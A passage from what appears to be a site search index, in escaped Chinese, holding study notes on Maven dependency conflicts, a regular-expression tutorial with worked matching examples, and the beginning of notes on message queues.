\u5728 POM \u4E2D\u6700\u5148\u58F0\u660E\u7684\u4F18\u5148\uFF0C\u4E0A\u9762\u7684\u4E24\u4E2A\u4F9D\u8D56\u5982\u679C\u5148\u58F0\u660E B\uFF0C\u90A3\u4E48\u6700\u540E\u4F7F\u7528 X(1.0)\u3002`},{header:"3. \u8986\u5199\u4F18\u5148\u539F\u5219",slug:"_3-\u8986\u5199\u4F18\u5148\u539F\u5219",content:"\u5B50 POM \u5185\u58F0\u660E\u7684\u4F9D\u8D56\u4F18\u5148\u4E8E\u7236 POM \u4E2D\u58F0\u660E\u7684\u4F9D\u8D56\u3002"},{header:"\u89E3\u51B3\u4F9D\u8D56\u51B2\u7A81",slug:"\u89E3\u51B3\u4F9D\u8D56\u51B2\u7A81",content:"\u627E\u5230 Maven \u52A0\u8F7D\u7684 Jar \u5305\u7248\u672C\uFF0C\u4F7F\u7528 mvn dependency:tree \u67E5\u770B\u4F9D\u8D56\u6811\uFF0C\u6839\u636E\u4F9D\u8D56\u539F\u5219\u6765\u8C03\u6574\u4F9D\u8D56\u5728 POM \u6587\u4EF6\u7684\u58F0\u660E\u987A\u5E8F\u3002"},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`POM Reference
What is a build tool?
Java Build Tools Comparisons: Ant vs Maven vs Gradle
maven 2 gradle
\u65B0\u4E00\u4EE3\u6784\u5EFA\u5DE5\u5177 gradle`}]},{path:"/java/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html",title:"\u6B63\u5219\u8868\u8FBE\u5F0F",pathLocale:"/",contents:[{header:"\u6B63\u5219\u8868\u8FBE\u5F0F",slug:"\u6B63\u5219\u8868\u8FBE\u5F0F",content:`\u6B63\u5219\u8868\u8FBE\u5F0F \u4E00\u3001\u6982\u8FF0
\u4E8C\u3001\u5339\u914D\u5355\u4E2A\u5B57\u7B26
\u4E09\u3001\u5339\u914D\u4E00\u7EC4\u5B57\u7B26
\u56DB\u3001\u4F7F\u7528\u5143\u5B57\u7B26
\u4E94\u3001\u91CD\u590D\u5339\u914D
\u516D\u3001\u4F4D\u7F6E\u5339\u914D
\u4E03\u3001\u4F7F\u7528\u5B50\u8868\u8FBE\u5F0F
\u516B\u3001\u56DE\u6EAF\u5F15\u7528
\u4E5D\u3001\u524D\u540E\u67E5\u627E
\u5341\u3001\u5D4C\u5165\u6761\u4EF6
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6982\u8FF0",slug:"\u4E00\u3001\u6982\u8FF0",content:`\u6B63\u5219\u8868\u8FBE\u5F0F\u7528\u4E8E\u6587\u672C\u5185\u5BB9\u7684\u67E5\u627E\u548C\u66FF\u6362\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F\u5185\u7F6E\u4E8E\u5176\u5B83\u8BED\u8A00\u6216\u8005\u8F6F\u4EF6\u4EA7\u54C1\u4E2D\uFF0C\u5B83\u672C\u8EAB\u4E0D\u662F\u4E00\u79CD\u8BED\u8A00\u6216\u8005\u8F6F\u4EF6\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F\u5728\u7EBF\u5DE5\u5177`},{header:"\u4E8C\u3001\u5339\u914D\u5355\u4E2A\u5B57\u7B26",slug:"\u4E8C\u3001\u5339\u914D\u5355\u4E2A\u5B57\u7B26",content:`. \u53EF\u4EE5\u7528\u6765\u5339\u914D\u4EFB\u4F55\u7684\u5355\u4E2A\u5B57\u7B26\uFF0C\u4F46\u662F\u5728\u7EDD\u5927\u591A\u6570\u5B9E\u73B0\u91CC\u9762\uFF0C\u4E0D\u80FD\u5339\u914D\u6362\u884C\u7B26\uFF1B
. \u662F\u5143\u5B57\u7B26\uFF0C\u8868\u793A\u5B83\u6709\u7279\u6B8A\u7684\u542B\u4E49\uFF0C\u800C\u4E0D\u662F\u5B57\u7B26\u672C\u8EAB\u7684\u542B\u4E49\u3002\u5982\u679C\u9700\u8981\u5339\u914D . \uFF0C\u90A3\u4E48\u8981\u7528 \\ \u8FDB\u884C\u8F6C\u4E49\uFF0C\u5373\u5728 . \u524D\u9762\u52A0\u4E0A \\ \u3002
\u6B63\u5219\u8868\u8FBE\u5F0F\u4E00\u822C\u662F\u533A\u5206\u5927\u5C0F\u5199\u7684\uFF0C\u4F46\u4E5F\u6709\u4E9B\u5B9E\u73B0\u4E0D\u533A\u5206\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
C.C2018
\u5339\u914D\u7ED3\u679C
My name is CyC2018 .`},{header:"\u4E09\u3001\u5339\u914D\u4E00\u7EC4\u5B57\u7B26",slug:"\u4E09\u3001\u5339\u914D\u4E00\u7EC4\u5B57\u7B26",content:`[ ] \u5B9A\u4E49\u4E00\u4E2A\u5B57\u7B26\u96C6\u5408\uFF1B
0-9\u3001a-z \u5B9A\u4E49\u4E86\u4E00\u4E2A\u5B57\u7B26\u533A\u95F4\uFF0C\u533A\u95F4\u4F7F\u7528 ASCII \u7801\u6765\u786E\u5B9A\uFF0C\u5B57\u7B26\u533A\u95F4\u5728 [ ] \u4E2D\u4F7F\u7528\u3002
- \u53EA\u6709\u5728 [ ] \u4E4B\u95F4\u624D\u662F\u5143\u5B57\u7B26\uFF0C\u5728 [ ] \u4E4B\u5916\u5C31\u662F\u4E00\u4E2A\u666E\u901A\u5B57\u7B26\uFF1B
^ \u5728 [ ] \u4E2D\u662F\u53D6\u975E\u64CD\u4F5C\u3002
\u5E94\u7528
\u5339\u914D\u4EE5 abc \u4E3A\u5F00\u5934\uFF0C\u5E76\u4E14\u6700\u540E\u4E00\u4E2A\u5B57\u6BCD\u4E0D\u4E3A\u6570\u5B57\u7684\u5B57\u7B26\u4E32\uFF1A
\u6B63\u5219\u8868\u8FBE\u5F0F
abc[^0-9]
\u5339\u914D\u7ED3\u679C abcd
abc1
abc2`},{header:"\u56DB\u3001\u4F7F\u7528\u5143\u5B57\u7B26",slug:"\u56DB\u3001\u4F7F\u7528\u5143\u5B57\u7B26",content:""},{header:"\u5339\u914D\u7A7A\u767D\u5B57\u7B26",slug:"\u5339\u914D\u7A7A\u767D\u5B57\u7B26",content:`\u5143\u5B57\u7B26
\u8BF4\u660E [\\b]
\u56DE\u9000\uFF08\u5220\u9664\uFF09\u4E00\u4E2A\u5B57\u7B26 \\f
\u6362\u9875\u7B26 \\n
\u6362\u884C\u7B26 \\r
\u56DE\u8F66\u7B26 \\t
\u5236\u8868\u7B26 \\v
\u5782\u76F4\u5236\u8868\u7B26 \\r\\n \u662F Windows \u4E2D\u7684\u6587\u672C\u884C\u7ED3\u675F\u6807\u7B7E\uFF0C\u5728 Unix/Linux \u5219\u662F \\n\u3002
\\r\\n\\r\\n \u53EF\u4EE5\u5339\u914D Windows \u4E0B\u7684\u7A7A\u767D\u884C\uFF0C\u56E0\u4E3A\u5B83\u5339\u914D\u4E24\u4E2A\u8FDE\u7EED\u7684\u884C\u5C3E\u6807\u7B7E\uFF0C\u800C\u8FD9\u6B63\u662F\u4E24\u6761\u8BB0\u5F55\u4E4B\u95F4\u7684\u7A7A\u767D\u884C\uFF1B`},{header:"\u5339\u914D\u7279\u5B9A\u7684\u5B57\u7B26",slug:"\u5339\u914D\u7279\u5B9A\u7684\u5B57\u7B26",content:""},{header:"1. \u6570\u5B57\u5143\u5B57\u7B26",slug:"_1-\u6570\u5B57\u5143\u5B57\u7B26",content:`\u5143\u5B57\u7B26
\u8BF4\u660E \\d
\u6570\u5B57\u5B57\u7B26\uFF0C\u7B49\u4EF7\u4E8E [0-9] \\D
\u975E\u6570\u5B57\u5B57\u7B26\uFF0C\u7B49\u4EF7\u4E8E [^0-9]`},{header:"2. \u5B57\u6BCD\u6570\u5B57\u5143\u5B57\u7B26",slug:"_2-\u5B57\u6BCD\u6570\u5B57\u5143\u5B57\u7B26",content:`\u5143\u5B57\u7B26
\u8BF4\u660E \\w
\u5927\u5C0F\u5199\u5B57\u6BCD\uFF0C\u4E0B\u5212\u7EBF\u548C\u6570\u5B57\uFF0C\u7B49\u4EF7\u4E8E [a-zA-Z0-9_] \\W
\u5BF9 \\w \u53D6\u975E`},{header:"3. \u7A7A\u767D\u5B57\u7B26\u5143\u5B57\u7B26",slug:"_3-\u7A7A\u767D\u5B57\u7B26\u5143\u5B57\u7B26",content:`\u5143\u5B57\u7B26
\u8BF4\u660E \\s
\u4EFB\u4F55\u4E00\u4E2A\u7A7A\u767D\u5B57\u7B26\uFF0C\u7B49\u4EF7\u4E8E [\\f\\n\\r\\t\\v] \\S
\u5BF9 \\s \u53D6\u975E \\x \u5339\u914D\u5341\u516D\u8FDB\u5236\u5B57\u7B26\uFF0C\\0 \u5339\u914D\u516B\u8FDB\u5236\uFF0C\u4F8B\u5982 \\xA \u5BF9\u5E94\u503C\u4E3A 10 \u7684 ASCII \u5B57\u7B26 \uFF0C\u5373 \\n\u3002`},{header:"\u4E94\u3001\u91CD\u590D\u5339\u914D",slug:"\u4E94\u3001\u91CD\u590D\u5339\u914D",content:`+ \u5339\u914D 1 \u4E2A\u6216\u8005\u591A\u4E2A\u5B57\u7B26
** * \u5339\u914D 0 \u4E2A\u6216\u8005\u591A\u4E2A\u5B57\u7B26
? \u5339\u914D 0 \u4E2A\u6216\u8005 1 \u4E2A\u5B57\u7B26 \u5E94\u7528
\u5339\u914D\u90AE\u7BB1\u5730\u5740\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
[\\w.]+@\\w+\\.\\w+
[\\w.] \u5339\u914D\u7684\u662F\u5B57\u6BCD\u6570\u5B57\u6216\u8005 . \uFF0C\u5728\u5176\u540E\u9762\u52A0\u4E0A + \uFF0C\u8868\u793A\u5339\u914D\u591A\u6B21\u3002\u5728\u5B57\u7B26\u96C6\u5408 [ ] \u91CC\uFF0C. \u4E0D\u662F\u5143\u5B57\u7B26\uFF1B
\u5339\u914D\u7ED3\u679C
abc.def<span>@</span>qq.com {n} \u5339\u914D n \u4E2A\u5B57\u7B26
{m,n} \u5339\u914D m~n \u4E2A\u5B57\u7B26
{m,} \u81F3\u5C11\u5339\u914D m \u4E2A\u5B57\u7B26 * \u548C + \u90FD\u662F\u8D2A\u5A6A\u578B\u5143\u5B57\u7B26\uFF0C\u4F1A\u5339\u914D\u5C3D\u53EF\u80FD\u591A\u7684\u5185\u5BB9\u3002\u5728\u540E\u9762\u52A0 ? \u53EF\u4EE5\u8F6C\u6362\u4E3A\u61D2\u60F0\u578B\u5143\u5B57\u7B26\uFF0C\u4F8B\u5982 *?\u3001+? \u548C {m,n}? \u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
a.+c
\u5339\u914D\u7ED3\u679C
abcabcabc
\u7531\u4E8E + \u662F\u8D2A\u5A6A\u578B\u7684\uFF0C\u56E0\u6B64 .+ \u4F1A\u5339\u914D\u66F4\u53EF\u80FD\u591A\u7684\u5185\u5BB9\uFF0C\u6240\u4EE5\u4F1A\u628A\u6574\u4E2A abcabcabc \u6587\u672C\u90FD\u5339\u914D\uFF0C\u800C\u4E0D\u662F\u53EA\u5339\u914D\u524D\u9762\u7684 abc \u6587\u672C\u3002\u7528\u61D2\u60F0\u578B\u53EF\u4EE5\u5B9E\u73B0\u5339\u914D\u524D\u9762\u7684\u3002`},{header:"\u516D\u3001\u4F4D\u7F6E\u5339\u914D",slug:"\u516D\u3001\u4F4D\u7F6E\u5339\u914D",content:""},{header:"\u5355\u8BCD\u8FB9\u754C",slug:"\u5355\u8BCD\u8FB9\u754C",content:`\\b \u53EF\u4EE5\u5339\u914D\u4E00\u4E2A\u5355\u8BCD\u7684\u8FB9\u754C\uFF0C\u8FB9\u754C\u662F\u6307\u4F4D\u4E8E \\w \u548C \\W \u4E4B\u95F4\u7684\u4F4D\u7F6E\uFF1B\\B \u5339\u914D\u4E00\u4E2A\u4E0D\u662F\u5355\u8BCD\u8FB9\u754C\u7684\u4F4D\u7F6E\u3002
\\b \u53EA\u5339\u914D\u4F4D\u7F6E\uFF0C\u4E0D\u5339\u914D\u5B57\u7B26\uFF0C\u56E0\u6B64 \\babc\\b \u5339\u914D\u51FA\u6765\u7684\u7ED3\u679C\u4E3A 3 \u4E2A\u5B57\u7B26\u3002`},{header:"\u5B57\u7B26\u4E32\u8FB9\u754C",slug:"\u5B57\u7B26\u4E32\u8FB9\u754C",content:`^ \u5339\u914D\u6574\u4E2A\u5B57\u7B26\u4E32\u7684\u5F00\u5934\uFF0C$ \u5339\u914D\u7ED3\u5C3E\u3002
^ \u5143\u5B57\u7B26\u5728\u5B57\u7B26\u96C6\u5408\u4E2D\u7528\u4F5C\u6C42\u975E\uFF0C\u5728\u5B57\u7B26\u96C6\u5408\u5916\u7528\u4F5C\u5339\u914D\u5B57\u7B26\u4E32\u7684\u5F00\u5934\u3002
\u5206\u884C\u5339\u914D\u6A21\u5F0F\uFF08multiline\uFF09\u4E0B\uFF0C\u6362\u884C\u88AB\u5F53\u505A\u5B57\u7B26\u4E32\u7684\u8FB9\u754C\u3002
\u5E94\u7528
\u5339\u914D\u4EE3\u7801\u4E2D\u4EE5 // \u5F00\u59CB\u7684\u6CE8\u91CA\u884C
\u6B63\u5219\u8868\u8FBE\u5F0F
^\\s*\\/\\/.*$ \u5339\u914D\u7ED3\u679C public void fun() { // \u6CE8\u91CA 1 int a = 1; int b = 2; // \u6CE8\u91CA 2 int c = a + b;
}`},{header:"\u4E03\u3001\u4F7F\u7528\u5B50\u8868\u8FBE\u5F0F",slug:"\u4E03\u3001\u4F7F\u7528\u5B50\u8868\u8FBE\u5F0F",content:`\u4F7F\u7528 ( ) \u5B9A\u4E49\u4E00\u4E2A\u5B50\u8868\u8FBE\u5F0F\u3002\u5B50\u8868\u8FBE\u5F0F\u7684\u5185\u5BB9\u53EF\u4EE5\u5F53\u6210\u4E00\u4E2A\u72EC\u7ACB\u5143\u7D20\uFF0C\u5373\u53EF\u4EE5\u5C06\u5B83\u770B\u6210\u4E00\u4E2A\u5B57\u7B26\uFF0C\u5E76\u4E14\u4F7F\u7528 * \u7B49\u5143\u5B57\u7B26\u3002
\u5B50\u8868\u8FBE\u5F0F\u53EF\u4EE5\u5D4C\u5957\uFF0C\u4F46\u662F\u5D4C\u5957\u5C42\u6B21\u8FC7\u6DF1\u4F1A\u53D8\u5F97\u5F88\u96BE\u7406\u89E3\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
(ab){2,}
\u5339\u914D\u7ED3\u679C
ababab
| \u662F\u6216\u5143\u5B57\u7B26\uFF0C\u5B83\u628A\u5DE6\u8FB9\u548C\u53F3\u8FB9\u6240\u6709\u7684\u90E8\u5206\u90FD\u770B\u6210\u5355\u72EC\u7684\u4E24\u4E2A\u90E8\u5206\uFF0C\u4E24\u4E2A\u90E8\u5206\u53EA\u8981\u6709\u4E00\u4E2A\u5339\u914D\u5C31\u884C\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
(19|20)\\d{2}
\u5339\u914D\u7ED3\u679C 1900
2010
1020 \u5E94\u7528
\u5339\u914D IP \u5730\u5740\u3002
IP \u5730\u5740\u4E2D\u6BCF\u90E8\u5206\u90FD\u662F 0-255 \u7684\u6570\u5B57\uFF0C\u7528\u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D\u65F6\u4EE5\u4E0B\u60C5\u51B5\u662F\u5408\u6CD5\u7684\uFF1A \u4E00\u4F4D\u6570\u5B57
\u4E0D\u4EE5 0 \u5F00\u5934\u7684\u4E24\u4F4D\u6570\u5B57
1 \u5F00\u5934\u7684\u4E09\u4F4D\u6570
2 \u5F00\u5934\uFF0C\u7B2C 2 \u4F4D\u662F 0-4 \u7684\u4E09\u4F4D\u6570
25 \u5F00\u5934\uFF0C\u7B2C 3 \u4F4D\u662F 0-5 \u7684\u4E09\u4F4D\u6570 \u6B63\u5219\u8868\u8FBE\u5F0F
((25[0-5]|(2[0-4]\\d)|(1\\d{2})|([1-9]\\d)|(\\d))\\.){3}(25[0-5]|(2[0-4]\\d)|(1\\d{2})|([1-9]\\d)|(\\d))
\u5339\u914D\u7ED3\u679C 192.168.0.1
00.00.00.00
555.555.555.555`},{header:"\u516B\u3001\u56DE\u6EAF\u5F15\u7528",slug:"\u516B\u3001\u56DE\u6EAF\u5F15\u7528",content:`\u56DE\u6EAF\u5F15\u7528\u4F7F\u7528 \\n \u6765\u5F15\u7528\u67D0\u4E2A\u5B50\u8868\u8FBE\u5F0F\uFF0C\u5176\u4E2D n \u4EE3\u8868\u7684\u662F\u5B50\u8868\u8FBE\u5F0F\u7684\u5E8F\u53F7\uFF0C\u4ECE 1 \u5F00\u59CB\u3002\u5B83\u548C\u5B50\u8868\u8FBE\u5F0F\u5339\u914D\u7684\u5185\u5BB9\u4E00\u81F4\uFF0C\u6BD4\u5982\u5B50\u8868\u8FBE\u5F0F\u5339\u914D\u5230 abc\uFF0C\u90A3\u4E48\u56DE\u6EAF\u5F15\u7528\u90E8\u5206\u4E5F\u9700\u8981\u5339\u914D abc \u3002
\u5E94\u7528
\u5339\u914D HTML \u4E2D\u5408\u6CD5\u7684\u6807\u9898\u5143\u7D20\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
\\1 \u5C06\u56DE\u6EAF\u5F15\u7528\u5B50\u8868\u8FBE\u5F0F (h[1-6]) \u5339\u914D\u7684\u5185\u5BB9\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5FC5\u987B\u548C\u5B50\u8868\u8FBE\u5F0F\u5339\u914D\u7684\u5185\u5BB9\u4E00\u81F4\u3002
<(h[1-6])>\\w*?<\\/\\1>
\u5339\u914D\u7ED3\u679C <h1>x</h1>
<h2>x</h2>
<h3>x</h1>`},{header:"\u66FF\u6362",slug:"\u66FF\u6362",content:`\u9700\u8981\u7528\u5230\u4E24\u4E2A\u6B63\u5219\u8868\u8FBE\u5F0F\u3002
\u5E94\u7528
\u4FEE\u6539\u7535\u8BDD\u53F7\u7801\u683C\u5F0F\u3002
\u6587\u672C
313-555-1234
\u67E5\u627E\u6B63\u5219\u8868\u8FBE\u5F0F
(\\d{3})(-)(\\d{3})(-)(\\d{4})
\u66FF\u6362\u6B63\u5219\u8868\u8FBE\u5F0F
\u5728\u7B2C\u4E00\u4E2A\u5B50\u8868\u8FBE\u5F0F\u67E5\u627E\u7684\u7ED3\u679C\u52A0\u4E0A () \uFF0C\u7136\u540E\u52A0\u4E00\u4E2A\u7A7A\u683C\uFF0C\u5728\u7B2C\u4E09\u4E2A\u548C\u7B2C\u4E94\u4E2A\u5B57\u8868\u8FBE\u5F0F\u67E5\u627E\u7684\u7ED3\u679C\u4E2D\u95F4\u52A0\u4E0A - \u8FDB\u884C\u5206\u9694\u3002
($1) $3-$5
\u7ED3\u679C
(313) 555-1234`},{header:"\u5927\u5C0F\u5199\u8F6C\u6362",slug:"\u5927\u5C0F\u5199\u8F6C\u6362",content:`\u5143\u5B57\u7B26
\u8BF4\u660E \\l
\u628A\u4E0B\u4E2A\u5B57\u7B26\u8F6C\u6362\u4E3A\u5C0F\u5199 \\u
\u628A\u4E0B\u4E2A\u5B57\u7B26\u8F6C\u6362\u4E3A\u5927\u5199 \\L
\u628A\\L \u548C\\E \u4E4B\u95F4\u7684\u5B57\u7B26\u5168\u90E8\u8F6C\u6362\u4E3A\u5C0F\u5199 \\U
\u628A\\U \u548C\\E \u4E4B\u95F4\u7684\u5B57\u7B26\u5168\u90E8\u8F6C\u6362\u4E3A\u5927\u5199 \\E
\u7ED3\u675F\\L \u6216\u8005\\U \u5E94\u7528
\u628A\u6587\u672C\u7684\u7B2C\u4E8C\u4E2A\u548C\u7B2C\u4E09\u4E2A\u5B57\u7B26\u8F6C\u6362\u4E3A\u5927\u5199\u3002
\u6587\u672C
abcd
\u67E5\u627E
(\\w)(\\w{2})(\\w)
\u66FF\u6362
$1\\U$2\\E$3
\u7ED3\u679C
aBCd`},{header:"\u4E5D\u3001\u524D\u540E\u67E5\u627E",slug:"\u4E5D\u3001\u524D\u540E\u67E5\u627E",content:`\u524D\u540E\u67E5\u627E\u89C4\u5B9A\u4E86\u5339\u914D\u7684\u5185\u5BB9\u9996\u5C3E\u5E94\u8BE5\u5339\u914D\u7684\u5185\u5BB9\uFF0C\u4F46\u662F\u53C8\u4E0D\u5305\u542B\u9996\u5C3E\u5339\u914D\u7684\u5185\u5BB9\u3002
\u5411\u524D\u67E5\u627E\u4F7F\u7528 ?= \u5B9A\u4E49\uFF0C\u5B83\u89C4\u5B9A\u4E86\u5C3E\u90E8\u5339\u914D\u7684\u5185\u5BB9\uFF0C\u8FD9\u4E2A\u5339\u914D\u7684\u5185\u5BB9\u5728 ?= \u4E4B\u540E\u5B9A\u4E49\u3002\u6240\u8C13\u5411\u524D\u67E5\u627E\uFF0C\u5C31\u662F\u89C4\u5B9A\u4E86\u4E00\u4E2A\u5339\u914D\u7684\u5185\u5BB9\uFF0C\u7136\u540E\u4EE5\u8FD9\u4E2A\u5185\u5BB9\u4E3A\u5C3E\u90E8\u5411\u524D\u9762\u67E5\u627E\u9700\u8981\u5339\u914D\u7684\u5185\u5BB9\u3002\u5411\u540E\u5339\u914D\u7528 ?<= \u5B9A\u4E49\uFF08\u6CE8: JavaScript \u4E0D\u652F\u6301\u5411\u540E\u5339\u914D\uFF0CJava \u5BF9\u5176\u652F\u6301\u4E5F\u4E0D\u5B8C\u5584\uFF09\u3002
\u5E94\u7528
\u67E5\u627E\u51FA\u90AE\u4EF6\u5730\u5740 @ \u5B57\u7B26\u524D\u9762\u7684\u90E8\u5206\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
\\w+(?=@)
\u7ED3\u679C
abc @qq.com
\u5BF9\u5411\u524D\u548C\u5411\u540E\u67E5\u627E\u53D6\u975E\uFF0C\u53EA\u8981\u628A = \u66FF\u6362\u6210 ! \u5373\u53EF\uFF0C\u6BD4\u5982 (?=) \u66FF\u6362\u6210 (?!) \u3002\u53D6\u975E\u64CD\u4F5C\u4F7F\u5F97\u5339\u914D\u90A3\u4E9B\u9996\u5C3E\u4E0D\u7B26\u5408\u8981\u6C42\u7684\u5185\u5BB9\u3002`},{header:"\u5341\u3001\u5D4C\u5165\u6761\u4EF6",slug:"\u5341\u3001\u5D4C\u5165\u6761\u4EF6",content:""},{header:"\u56DE\u6EAF\u5F15\u7528\u6761\u4EF6",slug:"\u56DE\u6EAF\u5F15\u7528\u6761\u4EF6",content:`\u6761\u4EF6\u4E3A\u67D0\u4E2A\u5B50\u8868\u8FBE\u5F0F\u662F\u5426\u5339\u914D\uFF0C\u5982\u679C\u5339\u914D\u5219\u9700\u8981\u7EE7\u7EED\u5339\u914D\u6761\u4EF6\u8868\u8FBE\u5F0F\u540E\u9762\u7684\u5185\u5BB9\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
\u5B50\u8868\u8FBE\u5F0F (\\() \u5339\u914D\u4E00\u4E2A\u5DE6\u62EC\u53F7\uFF0C\u5176\u540E\u7684 ? \u8868\u793A\u5339\u914D 0 \u4E2A\u6216\u8005 1 \u4E2A\u3002 ?(1) \u4E3A\u6761\u4EF6\uFF0C\u5F53\u5B50\u8868\u8FBE\u5F0F 1 \u5339\u914D\u65F6\u6761\u4EF6\u6210\u7ACB\uFF0C\u9700\u8981\u6267\u884C ) \u5339\u914D\uFF0C\u4E5F\u5C31\u662F\u5339\u914D\u53F3\u62EC\u53F7\u3002
(\\()?abc(?(1)\\))
\u7ED3\u679C (abc)
abc
(abc`},{header:"\u524D\u540E\u67E5\u627E\u6761\u4EF6",slug:"\u524D\u540E\u67E5\u627E\u6761\u4EF6",content:`\u6761\u4EF6\u4E3A\u5B9A\u4E49\u7684\u9996\u5C3E\u662F\u5426\u5339\u914D\uFF0C\u5982\u679C\u5339\u914D\uFF0C\u5219\u7EE7\u7EED\u6267\u884C\u540E\u9762\u7684\u5339\u914D\u3002\u6CE8\u610F\uFF0C\u9996\u5C3E\u4E0D\u5305\u542B\u5728\u5339\u914D\u7684\u5185\u5BB9\u4E2D\u3002
\u6B63\u5219\u8868\u8FBE\u5F0F
?(?=-) \u4E3A\u524D\u5411\u67E5\u627E\u6761\u4EF6\uFF0C\u53EA\u6709\u5728\u4EE5 - \u4E3A\u524D\u5411\u67E5\u627E\u7684\u7ED3\u5C3E\u80FD\u5339\u914D \\d{5} \uFF0C\u624D\u7EE7\u7EED\u5339\u914D -\\d{4} \u3002
\\d{5}(?(?=-)-\\d{4})
\u7ED3\u679C 11111
22222-
33333-4444`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:"BenForta. \u6B63\u5219\u8868\u8FBE\u5F0F\u5FC5\u77E5\u5FC5\u4F1A [M]. \u4EBA\u6C11\u90AE\u7535\u51FA\u7248\u793E, 2007."}]},{path:"/java/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html",title:"\u6D88\u606F\u961F\u5217",pathLocale:"/",contents:[{header:"\u6D88\u606F\u961F\u5217",slug:"\u6D88\u606F\u961F\u5217",content:`\u6D88\u606F\u961F\u5217 \u4E00\u3001\u6D88\u606F\u6A21\u578B \u70B9\u5BF9\u70B9
\u53D1\u5E03/\u8BA2\u9605 \u4E8C\u3001\u4F7F\u7528\u573A\u666F \u5F02\u6B65\u5904\u7406
\u6D41\u91CF\u524A\u950B
\u5E94\u7528\u89E3\u8026 \u4E09\u3001\u53EF\u9760\u6027 \u53D1\u9001\u7AEF\u7684\u53EF\u9760\u6027
\u63A5\u6536\u7AEF\u7684\u53EF\u9760\u6027 \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6D88\u606F\u6A21\u578B",slug:"\u4E00\u3001\u6D88\u606F\u6A21\u578B",content:""},{header:"\u70B9\u5BF9\u70B9",slug:"\u70B9\u5BF9\u70B9",content:"\u6D88\u606F\u751F\u4EA7\u8005\u5411\u6D88\u606F\u961F\u5217\u4E2D\u53D1\u9001\u4E86\u4E00\u4E2A\u6D88\u606F\u4E4B\u540E\uFF0C\u53EA\u80FD\u88AB\u4E00\u4E2A\u6D88\u8D39\u8005\u6D88\u8D39\u4E00\u6B21\u3002"},{header:"\u53D1\u5E03/\u8BA2\u9605",slug:"\u53D1\u5E03-\u8BA2\u9605",content:`\u6D88\u606F\u751F\u4EA7\u8005\u5411\u9891\u9053\u53D1\u9001\u4E00\u4E2A\u6D88\u606F\u4E4B\u540E\uFF0C\u591A\u4E2A\u6D88\u8D39\u8005\u53EF\u4EE5\u4ECE\u8BE5\u9891\u9053\u8BA2\u9605\u5230\u8FD9\u6761\u6D88\u606F\u5E76\u6D88\u8D39\u3002 \u53D1\u5E03\u4E0E\u8BA2\u9605\u6A21\u5F0F\u548C\u89C2\u5BDF\u8005\u6A21\u5F0F\u6709\u4EE5\u4E0B\u4E0D\u540C\uFF1A \u89C2\u5BDF\u8005\u6A21\u5F0F\u4E2D\uFF0C\u89C2\u5BDF\u8005\u548C\u4E3B\u9898\u90FD\u77E5\u9053\u5BF9\u65B9\u7684\u5B58\u5728\uFF1B\u800C\u5728\u53D1\u5E03\u4E0E\u8BA2\u9605\u6A21\u5F0F\u4E2D\uFF0C\u751F\u4EA7\u8005\u4E0E\u6D88\u8D39\u8005\u4E0D\u77E5\u9053\u5BF9\u65B9\u7684\u5B58\u5728\uFF0C\u5B83\u4EEC\u4E4B\u95F4\u901A\u8FC7\u9891\u9053\u8FDB\u884C\u901A\u4FE1\u3002
\u89C2\u5BDF\u8005\u6A21\u5F0F\u662F\u540C\u6B65\u7684\uFF0C\u5F53\u4E8B\u4EF6\u89E6\u53D1\u65F6\uFF0C\u4E3B\u9898\u4F1A\u8C03\u7528\u89C2\u5BDF\u8005\u7684\u65B9\u6CD5\uFF0C\u7136\u540E\u7B49\u5F85\u65B9\u6CD5\u8FD4\u56DE\uFF1B\u800C\u53D1\u5E03\u4E0E\u8BA2\u9605\u6A21\u5F0F\u662F\u5F02\u6B65\u7684\uFF0C\u751F\u4EA7\u8005\u5411\u9891\u9053\u53D1\u9001\u4E00\u4E2A\u6D88\u606F\u4E4B\u540E\uFF0C\u5C31\u4E0D\u9700\u8981\u5173\u5FC3\u6D88\u8D39\u8005\u4F55\u65F6\u53BB\u8BA2\u9605\u8FD9\u4E2A\u6D88\u606F\uFF0C\u53EF\u4EE5\u7ACB\u5373\u8FD4\u56DE\u3002`},{header:"\u4E8C\u3001\u4F7F\u7528\u573A\u666F",slug:"\u4E8C\u3001\u4F7F\u7528\u573A\u666F",content:""},{header:"\u5F02\u6B65\u5904\u7406",slug:"\u5F02\u6B65\u5904\u7406",content:`\u53D1\u9001\u8005\u5C06\u6D88\u606F\u53D1\u9001\u7ED9\u6D88\u606F\u961F\u5217\u4E4B\u540E\uFF0C\u4E0D\u9700\u8981\u540C\u6B65\u7B49\u5F85\u6D88\u606F\u63A5\u6536\u8005\u5904\u7406\u5B8C\u6BD5\uFF0C\u800C\u662F\u7ACB\u5373\u8FD4\u56DE\u8FDB\u884C\u5176\u5B83\u64CD\u4F5C\u3002\u6D88\u606F\u63A5\u6536\u8005\u4ECE\u6D88\u606F\u961F\u5217\u4E2D\u8BA2\u9605\u6D88\u606F\u4E4B\u540E\u5F02\u6B65\u5904\u7406\u3002
